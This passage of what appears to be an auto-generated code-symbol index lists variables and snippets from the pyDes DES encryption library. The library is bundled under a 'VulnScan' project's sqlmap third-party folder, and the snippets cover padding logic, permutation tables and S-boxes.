        "peekOfCode": "k = des(\"DESCRYPT\", CBC, \"\\0\\0\\0\\0\\0\\0\\0\\0\", pad=None, padmode=PAD_PKCS5)\n# For Python3, you'll need to use bytes, i.e.:\n#   data = b\"Please encrypt my data\"\n#   k = des(b\"DESCRYPT\", CBC, b\"\\0\\0\\0\\0\\0\\0\\0\\0\", pad=None, padmode=PAD_PKCS5)\nd = k.encrypt(data)\nprint \"Encrypted: %r\" % d\nprint \"Decrypted: %r\" % k.decrypt(d)\nassert k.decrypt(d, padmode=PAD_PKCS5) == data\nSee the module source (pyDes.py) for more examples of use.\nYou can also run the pyDes.py file without and arguments to see a simple test.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "d",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "d = k.encrypt(data)\nprint \"Encrypted: %r\" % d\nprint \"Decrypted: %r\" % k.decrypt(d)\nassert k.decrypt(d, padmode=PAD_PKCS5) == data\nSee the module source (pyDes.py) for more examples of use.\nYou can also run the pyDes.py file without and arguments to see a simple test.\nNote: This code was not written for high-end systems needing a fast\n      implementation, but rather a handy portable solution with small usage.\n\"\"\"\nimport sys",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "_pythonMajorVersion",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "_pythonMajorVersion = sys.version_info[0]\n# Modes of crypting / cyphering\nECB =\t0\nCBC =\t1\n# Modes of padding\nPAD_NORMAL = 1\nPAD_PKCS5 = 2\n# PAD_PKCS5: is a method that will unambiguously remove all padding\n#            characters after decryption, when originally encrypted with\n#            this padding mode.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "PAD_NORMAL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "PAD_NORMAL = 1\nPAD_PKCS5 = 2\n# PAD_PKCS5: is a method that will unambiguously remove all padding\n#            characters after decryption, when originally encrypted with\n#            this padding mode.\n# For a good description of the PKCS5 padding technique, see:\n# http://www.faqs.org/rfcs/rfc1423.html\n# The base class shared by des and triple des.\nclass _baseDes(object):\n\tdef __init__(self, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "PAD_PKCS5",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "PAD_PKCS5 = 2\n# PAD_PKCS5: is a method that will unambiguously remove all padding\n#            characters after decryption, when originally encrypted with\n#            this padding mode.\n# For a good description of the PKCS5 padding technique, see:\n# http://www.faqs.org/rfcs/rfc1423.html\n# The base class shared by des and triple des.\nclass _baseDes(object):\n\tdef __init__(self, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL):\n\t\tif IV:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tIV",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tIV = self._guardAgainstUnicode(IV)\n\t\tif pad:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tself.block_size = 8\n\t\t# Sanity checking of arguments.\n\t\tif pad and padmode == PAD_PKCS5:\n\t\t\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\t\tif IV and len(IV) != self.block_size:\n\t\t\traise ValueError(\"Invalid Initial Value (IV), must be a multiple of \" + str(self.block_size) + \" bytes\")\n\t\t# Set the passed in variables",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tpad",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tself.block_size = 8\n\t\t# Sanity checking of arguments.\n\t\tif pad and padmode == PAD_PKCS5:\n\t\t\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\t\tif IV and len(IV) != self.block_size:\n\t\t\traise ValueError(\"Invalid Initial Value (IV), must be a multiple of \" + str(self.block_size) + \" bytes\")\n\t\t# Set the passed in variables\n\t\tself._mode = mode\n\t\tself._iv = IV",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.block_size",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.block_size = 8\n\t\t# Sanity checking of arguments.\n\t\tif pad and padmode == PAD_PKCS5:\n\t\t\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\t\tif IV and len(IV) != self.block_size:\n\t\t\traise ValueError(\"Invalid Initial Value (IV), must be a multiple of \" + str(self.block_size) + \" bytes\")\n\t\t# Set the passed in variables\n\t\tself._mode = mode\n\t\tself._iv = IV\n\t\tself._padding = pad",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself._mode",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself._mode = mode\n\t\tself._iv = IV\n\t\tself._padding = pad\n\t\tself._padmode = padmode\n\tdef getKey(self):\n\t\t\"\"\"getKey() -> bytes\"\"\"\n\t\treturn self.__key\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object.\"\"\"\n\t\tkey = self._guardAgainstUnicode(key)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself._iv",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself._iv = IV\n\t\tself._padding = pad\n\t\tself._padmode = padmode\n\tdef getKey(self):\n\t\t\"\"\"getKey() -> bytes\"\"\"\n\t\treturn self.__key\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object.\"\"\"\n\t\tkey = self._guardAgainstUnicode(key)\n\t\tself.__key = key",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself._padding",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself._padding = pad\n\t\tself._padmode = padmode\n\tdef getKey(self):\n\t\t\"\"\"getKey() -> bytes\"\"\"\n\t\treturn self.__key\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object.\"\"\"\n\t\tkey = self._guardAgainstUnicode(key)\n\t\tself.__key = key\n\tdef getMode(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself._padmode",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself._padmode = padmode\n\tdef getKey(self):\n\t\t\"\"\"getKey() -> bytes\"\"\"\n\t\treturn self.__key\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object.\"\"\"\n\t\tkey = self._guardAgainstUnicode(key)\n\t\tself.__key = key\n\tdef getMode(self):\n\t\t\"\"\"getMode() -> pyDes.ECB or pyDes.CBC\"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tkey",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tkey = self._guardAgainstUnicode(key)\n\t\tself.__key = key\n\tdef getMode(self):\n\t\t\"\"\"getMode() -> pyDes.ECB or pyDes.CBC\"\"\"\n\t\treturn self._mode\n\tdef setMode(self, mode):\n\t\t\"\"\"Sets the type of crypting mode, pyDes.ECB or pyDes.CBC\"\"\"\n\t\tself._mode = mode\n\tdef getPadding(self):\n\t\t\"\"\"getPadding() -> bytes of length 1. Padding character.\"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.__key",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.__key = key\n\tdef getMode(self):\n\t\t\"\"\"getMode() -> pyDes.ECB or pyDes.CBC\"\"\"\n\t\treturn self._mode\n\tdef setMode(self, mode):\n\t\t\"\"\"Sets the type of crypting mode, pyDes.ECB or pyDes.CBC\"\"\"\n\t\tself._mode = mode\n\tdef getPadding(self):\n\t\t\"\"\"getPadding() -> bytes of length 1. Padding character.\"\"\"\n\t\treturn self._padding",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself._mode",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself._mode = mode\n\tdef getPadding(self):\n\t\t\"\"\"getPadding() -> bytes of length 1. Padding character.\"\"\"\n\t\treturn self._padding\n\tdef setPadding(self, pad):\n\t\t\"\"\"setPadding() -> bytes of length 1. Padding character.\"\"\"\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tself._padding = pad\n\tdef getPadMode(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tpad",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tself._padding = pad\n\tdef getPadMode(self):\n\t\t\"\"\"getPadMode() -> pyDes.PAD_NORMAL or pyDes.PAD_PKCS5\"\"\"\n\t\treturn self._padmode\n\tdef setPadMode(self, mode):\n\t\t\"\"\"Sets the type of padding mode, pyDes.PAD_NORMAL or pyDes.PAD_PKCS5\"\"\"\n\t\tself._padmode = mode\n\tdef getIV(self):\n\t\t\"\"\"getIV() -> bytes\"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself._padding",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself._padding = pad\n\tdef getPadMode(self):\n\t\t\"\"\"getPadMode() -> pyDes.PAD_NORMAL or pyDes.PAD_PKCS5\"\"\"\n\t\treturn self._padmode\n\tdef setPadMode(self, mode):\n\t\t\"\"\"Sets the type of padding mode, pyDes.PAD_NORMAL or pyDes.PAD_PKCS5\"\"\"\n\t\tself._padmode = mode\n\tdef getIV(self):\n\t\t\"\"\"getIV() -> bytes\"\"\"\n\t\treturn self._iv",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself._padmode",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself._padmode = mode\n\tdef getIV(self):\n\t\t\"\"\"getIV() -> bytes\"\"\"\n\t\treturn self._iv\n\tdef setIV(self, IV):\n\t\t\"\"\"Will set the Initial Value, used in conjunction with CBC mode\"\"\"\n\t\tif not IV or len(IV) != self.block_size:\n\t\t\traise ValueError(\"Invalid Initial Value (IV), must be a multiple of \" + str(self.block_size) + \" bytes\")\n\t\tIV = self._guardAgainstUnicode(IV)\n\t\tself._iv = IV",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tIV",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tIV = self._guardAgainstUnicode(IV)\n\t\tself._iv = IV\n\tdef _padData(self, data, pad, padmode):\n\t\t# Pad data depending on the mode\n\t\tif padmode is None:\n\t\t\t# Get the default padding mode.\n\t\t\tpadmode = self.getPadMode()\n\t\tif pad and padmode == PAD_PKCS5:\n\t\t\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\t\tif padmode == PAD_NORMAL:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself._iv",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself._iv = IV\n\tdef _padData(self, data, pad, padmode):\n\t\t# Pad data depending on the mode\n\t\tif padmode is None:\n\t\t\t# Get the default padding mode.\n\t\t\tpadmode = self.getPadMode()\n\t\tif pad and padmode == PAD_PKCS5:\n\t\t\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\t\tif padmode == PAD_NORMAL:\n\t\t\tif len(data) % self.block_size == 0:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tpadmode",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tpadmode = self.getPadMode()\n\t\tif pad and padmode == PAD_PKCS5:\n\t\t\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\t\tif padmode == PAD_NORMAL:\n\t\t\tif len(data) % self.block_size == 0:\n\t\t\t\t# No padding required.\n\t\t\t\treturn data\n\t\t\tif not pad:\n\t\t\t\t# Get the default padding.\n\t\t\t\tpad = self.getPadding()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tpad",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tpad = self.getPadding()\n\t\t\tif not pad:\n\t\t\t\traise ValueError(\"Data must be a multiple of \" + str(self.block_size) + \" bytes in length. Use padmode=PAD_PKCS5 or set the pad character.\")\n\t\t\tdata += (self.block_size - (len(data) % self.block_size)) * pad\n\t\telif padmode == PAD_PKCS5:\n\t\t\tpad_len = 8 - (len(data) % self.block_size)\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\tdata += pad_len * chr(pad_len)\n\t\t\telse:\n\t\t\t\tdata += bytes([pad_len] * pad_len)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tpad_len",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tpad_len = 8 - (len(data) % self.block_size)\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\tdata += pad_len * chr(pad_len)\n\t\t\telse:\n\t\t\t\tdata += bytes([pad_len] * pad_len)\n\t\treturn data\n\tdef _unpadData(self, data, pad, padmode):\n\t\t# Unpad data depending on the mode.\n\t\tif not data:\n\t\t\treturn data",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tpadmode",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tpadmode = self.getPadMode()\n\t\tif padmode == PAD_NORMAL:\n\t\t\tif not pad:\n\t\t\t\t# Get the default padding.\n\t\t\t\tpad = self.getPadding()\n\t\t\tif pad:\n\t\t\t\tdata = data[:-self.block_size] + \\\n\t\t\t\t       data[-self.block_size:].rstrip(pad)\n\t\telif padmode == PAD_PKCS5:\n\t\t\tif _pythonMajorVersion < 3:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tpad",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tpad = self.getPadding()\n\t\t\tif pad:\n\t\t\t\tdata = data[:-self.block_size] + \\\n\t\t\t\t       data[-self.block_size:].rstrip(pad)\n\t\telif padmode == PAD_PKCS5:\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\tpad_len = ord(data[-1])\n\t\t\telse:\n\t\t\t\tpad_len = data[-1]\n\t\t\tdata = data[:-pad_len]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tdata = data[:-self.block_size] + \\\n\t\t\t\t       data[-self.block_size:].rstrip(pad)\n\t\telif padmode == PAD_PKCS5:\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\tpad_len = ord(data[-1])\n\t\t\telse:\n\t\t\t\tpad_len = data[-1]\n\t\t\tdata = data[:-pad_len]\n\t\treturn data\n\tdef _guardAgainstUnicode(self, data):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tpad_len",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tpad_len = ord(data[-1])\n\t\t\telse:\n\t\t\t\tpad_len = data[-1]\n\t\t\tdata = data[:-pad_len]\n\t\treturn data\n\tdef _guardAgainstUnicode(self, data):\n\t\t# Only accept byte strings or ascii unicode values, otherwise\n\t\t# there is no way to correctly decode the data into bytes.\n\t\tif _pythonMajorVersion < 3:\n\t\t\tif isinstance(data, unicode):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tpad_len",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tpad_len = data[-1]\n\t\t\tdata = data[:-pad_len]\n\t\treturn data\n\tdef _guardAgainstUnicode(self, data):\n\t\t# Only accept byte strings or ascii unicode values, otherwise\n\t\t# there is no way to correctly decode the data into bytes.\n\t\tif _pythonMajorVersion < 3:\n\t\t\tif isinstance(data, unicode):\n\t\t\t\traise ValueError(\"pyDes can only work with bytes, not Unicode strings.\")\n\t\telse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tdata = data[:-pad_len]\n\t\treturn data\n\tdef _guardAgainstUnicode(self, data):\n\t\t# Only accept byte strings or ascii unicode values, otherwise\n\t\t# there is no way to correctly decode the data into bytes.\n\t\tif _pythonMajorVersion < 3:\n\t\t\tif isinstance(data, unicode):\n\t\t\t\traise ValueError(\"pyDes can only work with bytes, not Unicode strings.\")\n\t\telse:\n\t\t\tif isinstance(data, str):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t__pc1",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t__pc1 = [56, 48, 40, 32, 24, 16,  8,\n\t\t  0, 57, 49, 41, 33, 25, 17,\n\t\t  9,  1, 58, 50, 42, 34, 26,\n\t\t 18, 10,  2, 59, 51, 43, 35,\n\t\t 62, 54, 46, 38, 30, 22, 14,\n\t\t  6, 61, 53, 45, 37, 29, 21,\n\t\t 13,  5, 60, 52, 44, 36, 28,\n\t\t 20, 12,  4, 27, 19, 11,  3\n\t]\n\t# number left rotations of pc1",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t__left_rotations",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t__left_rotations = [\n\t\t1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1\n\t]\n\t# permuted choice key (table 2)\n\t__pc2 = [\n\t\t13, 16, 10, 23,  0,  4,\n\t\t 2, 27, 14,  5, 20,  9,\n\t\t22, 18, 11,  3, 25,  7,\n\t\t15,  6, 26, 19, 12,  1,\n\t\t40, 51, 30, 36, 46, 54,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t__pc2",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t__pc2 = [\n\t\t13, 16, 10, 23,  0,  4,\n\t\t 2, 27, 14,  5, 20,  9,\n\t\t22, 18, 11,  3, 25,  7,\n\t\t15,  6, 26, 19, 12,  1,\n\t\t40, 51, 30, 36, 46, 54,\n\t\t29, 39, 50, 44, 32, 47,\n\t\t43, 48, 38, 55, 33, 52,\n\t\t45, 41, 49, 35, 28, 31\n\t]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t__ip",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t__ip = [57, 49, 41, 33, 25, 17, 9,  1,\n\t\t59, 51, 43, 35, 27, 19, 11, 3,\n\t\t61, 53, 45, 37, 29, 21, 13, 5,\n\t\t63, 55, 47, 39, 31, 23, 15, 7,\n\t\t56, 48, 40, 32, 24, 16, 8,  0,\n\t\t58, 50, 42, 34, 26, 18, 10, 2,\n\t\t60, 52, 44, 36, 28, 20, 12, 4,\n\t\t62, 54, 46, 38, 30, 22, 14, 6\n\t]\n\t# Expansion table for turning 32 bit blocks into 48 bits",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t__expansion_table",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t__expansion_table = [\n\t\t31,  0,  1,  2,  3,  4,\n\t\t 3,  4,  5,  6,  7,  8,\n\t\t 7,  8,  9, 10, 11, 12,\n\t\t11, 12, 13, 14, 15, 16,\n\t\t15, 16, 17, 18, 19, 20,\n\t\t19, 20, 21, 22, 23, 24,\n\t\t23, 24, 25, 26, 27, 28,\n\t\t27, 28, 29, 30, 31,  0\n\t]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t__sbox",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t__sbox = [\n\t\t# S1\n\t\t[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,\n\t\t 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,\n\t\t 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,\n\t\t 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],\n\t\t# S2\n\t\t[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,\n\t\t 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,\n\t\t 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t__p",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t__p = [\n\t\t15, 6, 19, 20, 28, 11,\n\t\t27, 16, 0, 14, 22, 25,\n\t\t4, 17, 30, 9, 1, 7,\n\t\t23,13, 31, 26, 2, 8,\n\t\t18, 12, 29, 5, 21, 10,\n\t\t3, 24\n\t]\n\t# final permutation IP^-1\n\t__fp = [",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t__fp",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t__fp = [\n\t\t39,  7, 47, 15, 55, 23, 63, 31,\n\t\t38,  6, 46, 14, 54, 22, 62, 30,\n\t\t37,  5, 45, 13, 53, 21, 61, 29,\n\t\t36,  4, 44, 12, 52, 20, 60, 28,\n\t\t35,  3, 43, 11, 51, 19, 59, 27,\n\t\t34,  2, 42, 10, 50, 18, 58, 26,\n\t\t33,  1, 41,  9, 49, 17, 57, 25,\n\t\t32,  0, 40,  8, 48, 16, 56, 24\n\t]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.key_size",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.key_size = 8\n\t\tself.L = []\n\t\tself.R = []\n\t\tself.Kn = [ [0] * 48 ] * 16\t# 16 48-bit keys (K1 - K16)\n\t\tself.final = []\n\t\tself.setKey(key)\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object. Must be 8 bytes.\"\"\"\n\t\t_baseDes.setKey(self, key)\n\t\tself.__create_sub_keys()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.L",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.L = []\n\t\tself.R = []\n\t\tself.Kn = [ [0] * 48 ] * 16\t# 16 48-bit keys (K1 - K16)\n\t\tself.final = []\n\t\tself.setKey(key)\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object. Must be 8 bytes.\"\"\"\n\t\t_baseDes.setKey(self, key)\n\t\tself.__create_sub_keys()\n\tdef __String_to_BitList(self, data):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.R",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.R = []\n\t\tself.Kn = [ [0] * 48 ] * 16\t# 16 48-bit keys (K1 - K16)\n\t\tself.final = []\n\t\tself.setKey(key)\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object. Must be 8 bytes.\"\"\"\n\t\t_baseDes.setKey(self, key)\n\t\tself.__create_sub_keys()\n\tdef __String_to_BitList(self, data):\n\t\t\"\"\"Turn the string data, into a list of bits (1, 0)'s\"\"\"",
